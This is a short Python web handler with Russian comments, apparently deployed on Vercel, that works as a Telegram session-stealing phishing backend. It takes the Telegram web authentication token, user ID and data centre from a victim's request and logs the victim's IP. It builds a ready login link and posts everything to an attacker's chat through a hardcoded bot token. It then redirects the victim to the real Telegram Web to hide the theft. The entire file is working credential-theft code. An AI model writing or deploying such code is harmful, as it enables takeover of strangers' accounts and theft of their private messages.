from http.server import BaseHTTPRequestHandler
import urllib.parse
import requests
from datetime import datetime

# ⚠️ ТВОИ ДАННЫЕ (проверь!)
BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # 1. ПАРСИМ ВХОДЯЩИЙ ЗАПРОС
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            
            # 2. ИЗВЛЕКАЕМ ДАННЫЕ
            token = params.get('tgWebAuthToken', [''])[0]
            user_id = params.get('tgWebAuthUserId', [''])[0]
            dc_id = params.get('tgWebAuthDcId', ['2'])[0]
            
            # 3. ПОЛУЧАЕМ РЕАЛЬНЫЙ IP
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            # 4. ЛОГИРУЕМ В VERCEL
            print(f"🔥 ВРЕМЯ: {datetime.now().isoformat()}")
            print(f"📦 ПАРАМЕТРЫ: token={token}, user={user_id}, dc={dc_id}")
            print(f"📡 IP: {ip}")
            print(f"🔗 Полный путь: {self.path}")
            
            # 5. ЕСЛИ ЕСТЬ ТОКЕН - ОТПРАВЛЯЕМ В TELEGRAM
            if token and user_id:
                # Формируем ссылку для входа
                login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
                
                message = (
                    f"🔥 <b>НОВЫЙ АККАУНТ!</b>\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"🔑 Token: <code>{token}</code>\n"
                    f"🌐 DC: {dc_id}\n"
                    f"📱 IP: <code>{ip}</code>\n"
                    f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
                    f"🔗 <b>ССЫЛКА ДЛЯ ВХОДА:</b>\n"
                    f"{login_url}"
                )
                
                # Отправка в Telegram
                response = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={
                        "chat_id": CHAT_ID,
                        "text": message,
                        "parse_mode": "HTML"
                    },
                    timeout=10
                )
                
                # Логируем результат отправки
                print(f"📤 TELEGRAM ОТВЕТ: {response.status_code}")
                if response.status_code != 200:
                    print(f"❌ ОШИБКА TELEGRAM: {response.text}")
                else:
                    print("✅ УСПЕШНО ОТПРАВЛЕНО В TELEGRAM")
            
            # 6. РЕДИРЕКТ НА НАСТОЯЩИЙ TELEGRAM
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
            
        except Exception as e:
            # Логируем ошибку
            print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
            
            # Даже при ошибке редиректим
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
    
    def do_POST(self):
        # Обрабатываем POST запросы так же как GET
        self.do_GET()
